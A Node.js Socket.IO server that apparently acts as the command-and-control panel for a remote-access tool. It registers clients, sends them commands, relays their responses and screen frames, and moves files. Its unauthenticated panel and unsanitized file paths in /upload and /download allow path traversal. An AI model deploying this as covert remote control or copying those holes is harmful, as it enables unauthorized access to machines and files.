"use strict"

// --------------- INCLUDES ---------------
const express = require('express')
const app = express()
const http = require('http').Server(app)
const io = require('socket.io')(http)
const fs = require("fs")
const fileUpload = require('express-fileupload')

// --------------- VARIABLES ---------------
const port = process.env.PORT || 3000
let allClients = []

app.use(fileUpload({}));
app.use("/", express.static(__dirname + "/panel"))

// --------------- ROUTES ---------------
app.post('/upload', (req, res) => {
    if (!req.files || Object.keys(req.files).length === 0) {
        res.status(400).send('No files were uploaded.')
        return
    }

    let uploadFile = req.files.uploadFile
    let uploadPath = __dirname + '/panel/uploads/' + uploadFile.name

    if (!fs.existsSync(__dirname + '/panel/uploads/')) {
        fs.mkdirSync(__dirname + '/panel/uploads/')
    }

    uploadFile.mv(uploadPath, function (err) {
        if (err) {
            return res.status(500).send(err)
        }

        res.send('File uploaded to ' + uploadPath)
    })
})

app.get("/download", (req, res) => {
    if (!fs.existsSync(__dirname + '/panel/downloads/'))
        return res.status(404).send("Downloads directory not found")

    let filename = req.query.file
    let filePath = __dirname + '/panel/downloads/' + filename

    if (!fs.existsSync(filePath))
        return res.status(404).send("File not found")

    res.download(filePath)
})

// --------------- SOCKIO CONNECTION ---------------
io.on('connection', (socket) => {
    let addedClient = false

    // --------------- CLIENT FUNCTIONS ---------------
    socket.on("add_client", (options) => {
        if (addedClient) return

        socket.clientData = Object.assign(options, {id: allClients.length})
        addedClient = true
        allClients.push(socket)
    })

    socket.on("response", (data) => {
        console.log(data)
        socket.broadcast.emit("response", data)
    })

    socket.on("frame", (imageBuffer) => {
        socket.broadcast.emit("frame", imageBuffer.toString("base64"))
    })

    // --------------- PANEL FUNCTIONS ---------------
    socket.on("command", (options) => {
        allClients.forEach((s) => {
            if (s.clientData["id"] === options["id"]) {
                s.emit("command", options)
            }
        })
    })

    socket.on("get_data", (ack) => {
        if (ack) {
            let dataList = []
            allClients.forEach((val) => {
                dataList.push(val.clientData)
            })
            ack(dataList)
        }
    })

    socket.emit("command", {event: "greet"})
})


// --------------- START SERVER ---------------
http.listen(port, () => {
    console.log(`Socket.IO server running at http://localhost:${port}/`)
})